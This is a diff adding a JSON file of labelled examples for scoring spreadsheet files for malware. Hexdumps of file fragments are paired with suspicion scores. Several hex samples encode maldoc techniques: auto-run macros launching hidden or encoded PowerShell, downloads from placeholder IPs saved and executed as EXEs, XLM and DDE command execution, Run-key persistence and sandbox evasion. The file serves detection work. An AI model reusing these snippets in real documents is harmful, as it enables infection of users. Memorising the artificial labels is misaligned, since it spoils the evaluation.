@@ -1,0 +1,250 @@
+[
+  {
+    "role": "user",
+    "content": "Meta: filetype=xlsx size=1850B triggers=none\n\nHexdump:\n50 4b 03 04 14 00 06 00 08 00 00 00 21 00\n5b 43 6f 6e 74 65 6e 74 5f 54 79 70 65 73 5d 2e 78 6d 6c\n5f 72 65 6c 73 2f 2e 72 65 6c 73 20 78 6c 2f 77 6f 72 6b 62 6f 6f 6b 2e 78 6d 6c"
+  },
+  {
+    "role": "assistant",
+    "content": "0.02 – normal XLSX ZIP/OpenXML container paths, no macro or external execution indicators"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=xlsx size=730B triggers=none\n\nHexdump:\n3c 77 6f 72 6b 62 6f 6f 6b 20 78 6d 6c 6e 73 3d 22 68 74 74 70\n3c 73 68 65 65 74 73 3e 3c 73 68 65 65 74 20 6e 61 6d 65 3d 22 53 68 65 65 74 31 22\n3c 63 61 6c 63 50 72 20 63 61 6c 63 49 64 3d 22 31 36 32 39 31 33 22 2f 3e"
+  },
+  {
+    "role": "assistant",
+    "content": "0.01 – benign workbook XML with sheet metadata and calculation properties"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=xlsx size=960B triggers=none\n\nHexdump:\n78 6c 2f 73 68 61 72 65 64 53 74 72 69 6e 67 73 2e 78 6d 6c\n3c 73 73 74 20 63 6f 75 6e 74 3d 22 34 22 20 75 6e 69 71 75 65 43 6f 75 6e 74 3d 22 34 22 3e\n3c 74 3e 49 6e 76 6f 69 63 65 3c 2f 74 3e 3c 74 3e 54 6f 74 61 6c 3c 2f 74 3e"
+  },
+  {
+    "role": "assistant",
+    "content": "0.01 – ordinary sharedStrings content, no code, macro, link, or embedded-object signal"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=xlsx size=1250B triggers=none\n\nHexdump:\n78 6c 2f 77 6f 72 6b 73 68 65 65 74 73 2f 73 68 65 65 74 31 2e 78 6d 6c\n3c 63 20 72 3d 22 43 32 22 3e 3c 66 3e 53 55 4d 28 41 32 3a 42 32 29 3c 2f 66 3e\n3c 76 3e 31 30 30 3c 2f 76 3e 3c 2f 63 3e"
+  },
+  {
+    "role": "assistant",
+    "content": "0.02 – normal worksheet formula such as SUM, not an execution or download indicator"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=xlsx size=1420B triggers=externalLink\n\nHexdump:\n78 6c 2f 65 78 74 65 72 6e 61 6c 4c 69 6e 6b 73 2f 65 78 74 65 72 6e 61 6c 4c 69 6e 6b 31 2e 78 6d 6c\n65 78 74 65 72 6e 61 6c 42 6f 6f 6b 20 72 3a 69 64 3d 22 72 49 64 31 22\n68 74 74 70 73 3a 2f 2f 63 6f 6d 70 61 6e 79 2e 65 78 61 6d 70 6c 65 2f 70 72 69 63 65 73 2e 78 6c 73 78"
+  },
+  {
+    "role": "assistant",
+    "content": "0.22 – external workbook link may be legitimate but deserves review when source trust is unknown"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=xlsx size=2700B triggers=oleObject\n\nHexdump:\n78 6c 2f 65 6d 62 65 64 64 69 6e 67 73 2f 6f 6c 65 4f 62 6a 65 63 74 31 2e 62 69 6e\n6f 6c 65 4f 62 6a 65 63 74 20 70 72 6f 67 49 64 3d 22 50 61 63 6b 61 67 65 22\n72 49 64 31 20 6f 6c 65 55 70 64 61 74 65 3d 22 4f 6e 43 61 6c 6c 22"
+  },
+  {
+    "role": "assistant",
+    "content": "0.45 – embedded OLE package is suspicious in spreadsheets but not enough alone to prove malware"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=xls size=512B triggers=none\n\nHexdump:\nd0 cf 11 e0 a1 b1 1a e1 00 00 00 00 00 00 00 00\n57 6f 72 6b 62 6f 6f 6b 00 00 00 00 00 00 00 00\n05 00 00 00 42 6f 6f 6b 00 53 75 6d 6d 61 72 79 49 6e 66 6f 72 6d 61 74 69 6f 6e"
+  },
+  {
+    "role": "assistant",
+    "content": "0.03 – normal legacy XLS OLE compound-file structure with workbook streams"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=xls size=1800B triggers=VBA\n\nHexdump:\n5f 56 42 41 5f 50 52 4f 4a 45 43 54 00 56 42 41 00 64 69 72 00\n4d 6f 64 75 6c 65 31 00 53 68 65 65 74 31 00 54 68 69 73 57 6f 72 6b 62 6f 6f 6b\n41 74 74 72 69 62 75 74 65 20 56 42 5f 4e 61 6d 65 20 3d 20 22 4d 6f 64 75 6c 65 31 22"
+  },
+  {
+    "role": "assistant",
+    "content": "0.30 – VBA project exists; macros need inspection but presence alone is not definitive malware"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=xlsm size=2200B triggers=vbaProject.bin\n\nHexdump:\n78 6c 2f 76 62 61 50 72 6f 6a 65 63 74 2e 62 69 6e\n5f 56 42 41 5f 50 52 4f 4a 45 43 54 00 56 42 41 00 64 69 72 00\n54 68 69 73 57 6f 72 6b 62 6f 6f 6b 00 4d 6f 64 75 6c 65 31 00"
+  },
+  {
+    "role": "assistant",
+    "content": "0.30 – macro-enabled workbook with vbaProject.bin, suspicious only after macro behavior is known"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=xlsm size=3400B triggers=VBA,AutoOpen\n\nHexdump:\n50 72 69 76 61 74 65 20 53 75 62 20 57 6f 72 6b 62 6f 6f 6b 5f 4f 70 65 6e 28 29\n20 20 43 61 6c 6c 20 52 75 6e 4d 65 28 29\n45 6e 64 20 53 75 62 0d 0a 53 75 62 20 52 75 6e 4d 65 28 29"
+  },
+  {
+    "role": "assistant",
+    "content": "0.70 – Workbook_Open auto-executes macro code, a common maldoc launch mechanism"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=xlsm size=4100B triggers=VBA,AutoOpen,WScript.Shell\n\nHexdump:\n53 75 62 20 41 75 74 6f 5f 4f 70 65 6e 28 29\n53 65 74 20 73 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 53 63 72 69 70 74 2e 53 68 65 6c 6c 22 29\n73 2e 52 75 6e 20 22 70 6f 77 65 72 73 68 65 6c 6c 20 2d 77 20 68 69 64 64 65 6e 22"
+  },
+  {
+    "role": "assistant",
+    "content": "0.94 – auto-executing macro invokes WScript.Shell and hidden PowerShell, strong malware behavior"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=xlsm size=3900B triggers=VBA,network\n\nHexdump:\n53 65 74 20 78 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 4d 53 58 4d 4c 32 2e 58 4d 4c 48 54 54 50 22 29\n78 2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 22 68 74 74 70 3a 2f 2f 31 39 32 2e 30 2e 32 2e 31 30 2f 70 61 79 6c 6f 61 64 22\n78 2e 53 65 6e 64"
+  },
+  {
+    "role": "assistant",
+    "content": "0.90 – macro creates MSXML2.XMLHTTP and fetches a remote payload, typical downloader behavior"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=xlsm size=4300B triggers=VBA,ADODB.Stream,download\n\nHexdump:\n53 65 74 20 73 74 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 41 44 4f 44 42 2e 53 74 72 65 61 6d 22 29\n73 74 2e 54 79 70 65 20 3d 20 31 3a 20 73 74 2e 4f 70 65 6e\n73 74 2e 53 61 76 65 54 6f 46 69 6c 65 20 45 6e 76 69 72 6f 6e 28 22 54 45 4d 50 22 29 20 26 20 22 5c 5c 75 70 64 61 74 65 2e 65 78 65 22"
+  },
+  {
+    "role": "assistant",
+    "content": "0.92 – ADODB.Stream saves content as an executable, strong staged-payload indicator"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=xlsm size=3800B triggers=VBA,URLDownloadToFileA\n\nHexdump:\n44 65 63 6c 61 72 65 20 46 75 6e 63 74 69 6f 6e 20 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 41\n4c 69 62 20 22 75 72 6c 6d 6f 6e 22 20 41 6c 69 61 73 20 22 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 41 22\n43 61 6c 6c 20 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 41"
+  },
+  {
+    "role": "assistant",
+    "content": "0.88 – macro imports URLDownloadToFileA for remote file retrieval, common maldoc downloader signal"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=xlsm size=4600B triggers=VBA,ShellExecute,cmd\n\nHexdump:\n44 65 63 6c 61 72 65 20 50 74 72 53 61 66 65 20 46 75 6e 63 74 69 6f 6e 20 53 68 65 6c 6c 45 78 65 63 75 74 65 41\n4c 69 62 20 22 73 68 65 6c 6c 33 32 22 20 41 6c 69 61 73 20 22 53 68 65 6c 6c 45 78 65 63 75 74 65 41 22\n63 6d 64 2e 65 78 65 20 2f 63 20 73 74 61 72 74 20 25 54 45 4d 50 25 5c 75 70 64 61 74 65 2e 65 78 65"
+  },
+  {
+    "role": "assistant",
+    "content": "0.90 – ShellExecute/cmd launches a file from TEMP, strong execution behavior"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=xls size=2400B triggers=XLM,auto_exec\n\nHexdump:\n42 4f 55 4e 44 53 48 45 45 54 20 6e 61 6d 65 3d 22 6d 61 63 72 6f 31 22\n41 55 54 4f 5f 4f 50 45 4e 00 45 58 45 43 00 43 41 4c 4c 00\n52 55 4e 28 22 63 6d 64 2e 65 78 65 22 29"
+  },
+  {
+    "role": "assistant",
+    "content": "0.93 – Excel 4.0/XLM auto macro uses EXEC/CALL to launch commands, very suspicious"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=xls size=2600B triggers=XLM,REGISTER\n\nHexdump:\n52 45 47 49 53 54 45 52 28 22 75 72 6c 6d 6f 6e 22 2c 22 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 41 22 29\n43 41 4c 4c 28 22 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 41 22 29\n45 58 45 43 28 22 25 54 45 4d 50 25 5c 5c 61 2e 65 78 65 22 29"
+  },
+  {
+    "role": "assistant",
+    "content": "0.96 – XLM macro registers URL download API and executes downloaded EXE, high-confidence malware"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=xlsx size=3100B triggers=externalLink,DDE\n\nHexdump:\n64 64 65 4c 69 6e 6b 20 64 64 65 53 65 72 76 69 63 65 3d 22 63 6d 64 22 20 64 64 65 54 6f 70 69 63 3d 22 2f 63 20 70 6f 77 65 72 73 68 65 6c 6c 22\n44 44 45 41 55 54 4f 20 63 6d 64 7c 27 2f 63 20 63 61 6c 63 27 21 41 30"
+  },
+  {
+    "role": "assistant",
+    "content": "0.91 – DDE/DDEAUTO launches cmd/PowerShell from spreadsheet content, strong exploitation indicator"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=xlsx size=2800B triggers=externalLink,remoteTemplate\n\nHexdump:\n3c 52 65 6c 61 74 69 6f 6e 73 68 69 70 20 49 64 3d 22 72 49 64 35 22\n54 79 70 65 3d 22 68 74 74 70 3a 2f 2f 73 63 68 65 6d 61 73 2e 6f 70 65 6e 78 6d 6c 66 6f 72 6d 61 74 73 2e 6f 72 67 2f 6f 66 66 69 63 65 44 6f 63 75 6d 65 6e 74 2f 32 30 30 36 2f 72 65 6c 61 74 69 6f 6e 73 68 69 70 73 2f 61 74 74 61 63 68 65 64 54 65 6d 70 6c 61 74 65 22\n54 61 72 67 65 74 3d 22 68 74 74 70 3a 2f 2f 31 39 32 2e 30 2e 32 2e 32 30 2f 74 2e 78 6c 73 6d 22"
+  },
+  {
+    "role": "assistant",
+    "content": "0.76 – remote attached template/workbook relationship can fetch attacker-controlled macro content"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=xlsm size=5200B triggers=VBA,obfuscation\n\nHexdump:\n61 20 3d 20 43 68 72 28 31 31 39 29 20 26 20 43 68 72 28 73 29 20 26 20 43 68 72 28 63 29 20 26 20 43 68 72 28 31 30 35 29 20 26 20 43 68 72 28 70 29 20 26 20 43 68 72 28 74 29\n62 20 3d 20 53 74 72 52 65 76 65 72 73 65 28 22 6c 6c 65 68 53 2e 74 70 69 72 63 53 57 22 29\n45 78 65 63 75 74 65 28 61 20 26 20 62 29"
+  },
+  {
+    "role": "assistant",
+    "content": "0.82 – macro uses Chr/StrReverse obfuscation and dynamic Execute, common payload-hiding pattern"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=xlsx size=4800B triggers=base64,large_string\n\nHexdump:\n3c 74 3e 54 56 71 51 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 3d 3d 3c 2f 74 3e\n3c 74 3e 64 6f 63 75 6d 65 6e 74 20 63 6f 6e 74 65 6e 74 3c 2f 74 3e"
+  },
+  {
+    "role": "assistant",
+    "content": "0.40 – large encoded-looking string may hide payload data but needs decoding and execution context"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=xlsx size=7600B triggers=embeddedPE,oleObject\n\nHexdump:\n78 6c 2f 65 6d 62 65 64 64 69 6e 67 73 2f 6f 6c 65 4f 62 6a 65 63 74 32 2e 62 69 6e\n4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 b8 00 00 00\n50 45 00 00 4c 01 03 00 00 00 00 00 00 00 00 00"
+  },
+  {
+    "role": "assistant",
+    "content": "0.95 – embedded OLE object contains MZ/PE executable header, high-confidence malicious payload indicator"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=xlsm size=3500B triggers=VBA,registry\n\nHexdump:\n53 65 74 20 73 68 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 53 63 72 69 70 74 2e 53 68 65 6c 6c 22 29\n73 68 2e 52 65 67 57 72 69 74 65 20 22 48 4b 43 55 5c 53 6f 66 74 77 61 72 65 5c 4d 69 63 72 6f 73 6f 66 74 5c 57 69 6e 64 6f 77 73 5c 43 75 72 72 65 6e 74 56 65 72 73 69 6f 6e 5c 52 75 6e 5c 75 70 64 61 74 65 22"
+  },
+  {
+    "role": "assistant",
+    "content": "0.86 – macro writes a Run-key persistence value, strong malicious persistence behavior"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=xlsm size=3000B triggers=VBA,documentProperties\n\nHexdump:\n53 75 62 20 43 6c 65 61 6e 46 6f 72 6d 61 74 28 29\n52 61 6e 67 65 28 22 41 31 3a 44 31 30 22 29 2e 46 6f 6e 74 2e 42 6f 6c 64 20 3d 20 54 72 75 65\n43 6f 6c 75 6d 6e 73 28 22 41 3a 44 22 29 2e 41 75 74 6f 46 69 74"
+  },
+  {
+    "role": "assistant",
+    "content": "0.12 – benign-looking VBA formatting macro without auto-exec, shell, network, or persistence behavior"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=xlsb size=3700B triggers=VBA,binaryWorkbook\n\nHexdump:\n78 6c 2f 77 6f 72 6b 62 6f 6f 6b 2e 62 69 6e 20 78 6c 2f 76 62 61 50 72 6f 6a 65 63 74 2e 62 69 6e\n5f 56 42 41 5f 50 52 4f 4a 45 43 54 00 56 42 41 00 64 69 72 00\n41 74 74 72 69 62 75 74 65 20 56 42 5f 44 65 73 63 72 69 70 74 69 6f 6e"
+  },
+  {
+    "role": "assistant",
+    "content": "0.35 – binary workbook contains VBA project; suspicious but behavior is not shown in this chunk"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=xlsx size=22000B triggers=none\n\nHexdump:\n9c 78 da 63 60 60 64 60 62 60 66 60 61 60 65 60 63\n7b 8f 29 c2 51 4b 7c e1 a3 d7 08 9a 65 29 00 15 ee 03 9f\n4f 2a 61 53 82 41 00 81 91 11 33 24 66 88 11 00"
+  },
+  {
+    "role": "assistant",
+    "content": "0.08 – compressed or high-entropy workbook data alone is weak evidence without execution indicators"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=xlsx size=3300B triggers=PowerQuery,externalConnection\n\nHexdump:\n78 6c 2f 63 6f 6e 6e 65 63 74 69 6f 6e 73 2e 78 6d 6c\n64 62 50 72 20 63 6f 6e 6e 65 63 74 69 6f 6e 3d 22 55 52 4c 3d 68 74 74 70 3a 2f 2f 65 78 61 6d 70 6c 65 2e 63 6f 6d 2f 64 61 74 61 2e 63 73 76 22\n78 6c 2f 71 75 65 72 79 54 61 62 6c 65 73 2f 71 75 65 72 79 54 61 62 6c 65 31 2e 78 6d 6c"
+  },
+  {
+    "role": "assistant",
+    "content": "0.28 – external data connection or PowerQuery can be legitimate but is risky from untrusted files"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=xlsm size=4400B triggers=VBA,anti_analysis\n\nHexdump:\n49 66 20 45 6e 76 69 72 6f 6e 28 22 55 53 45 52 4e 41 4d 45 22 29 20 3d 20 22 73 61 6e 64 62 6f 78 22 20 54 68 65 6e 20 45 6e 64\n49 66 20 41 70 70 6c 69 63 61 74 69 6f 6e 2e 52 65 63 65 6e 74 46 69 6c 65 73 2e 43 6f 75 6e 74 20 3c 20 33 20 54 68 65 6e 20 45 6e 64\n53 6c 65 65 70 20 35 30 30 30"
+  },
+  {
+    "role": "assistant",
+    "content": "0.78 – macro checks environment and delays execution, behavior often used for sandbox evasion"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=csv size=900B triggers=formulaInjection\n\nHexdump:\n4e 61 6d 65 2c 41 6d 6f 75 6e 74 2c 4e 6f 74 65 0a\n41 6c 69 63 65 2c 31 30 30 2c 3d 48 59 50 45 52 4c 49 4e 4b 28 22 68 74 74 70 3a 2f 2f 65 78 61 6d 70 6c 65 2e 63 6f 6d 22 2c 22 63 6c 69 63 6b 22 29"
+  },
+  {
+    "role": "assistant",
+    "content": "0.25 – spreadsheet formula injection risk exists, but this chunk only shows a hyperlink formula"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=xlsm size=4700B triggers=VBA,base64,PowerShell\n\nHexdump:\n63 6d 64 20 3d 20 22 70 6f 77 65 72 73 68 65 6c 6c 20 2d 45 6e 63 6f 64 65 64 43 6f 6d 6d 61 6e 64 20 53 51 42 46 41 48 67 41 49 41 42 4f 41 47 55 41 64 77 42 74 41 43 30 41 54 77 42 69 41 47 6f 41 5a 51 42 6a 41 48 51 41 22\n43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 53 63 72 69 70 74 2e 53 68 65 6c 6c 22 29 2e 52 75 6e 20 63 6d 64"
+  },
+  {
+    "role": "assistant",
+    "content": "0.96 – macro runs encoded PowerShell through WScript.Shell, high-confidence malicious execution"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=xlsx size=2100B triggers=hyperlink\n\nHexdump:\n3c 68 79 70 65 72 6c 69 6e 6b 20 72 65 66 3d 22 41 31 22 20 72 3a 69 64 3d 22 72 49 64 31 22 2f 3e\n3c 52 65 6c 61 74 69 6f 6e 73 68 69 70 20 49 64 3d 22 72 49 64 31 22 20 54 61 72 67 65 74 3d 22 68 74 74 70 73 3a 2f 2f 69 6e 74 72 61 6e 65 74 2e 65 78 61 6d 70 6c 65 2f 72 65 70 6f 72 74 22 2f 3e"
+  },
+  {
+    "role": "assistant",
+    "content": "0.10 – normal spreadsheet hyperlink; mildly risky only if URL or surrounding content is suspicious"
+  }
+]
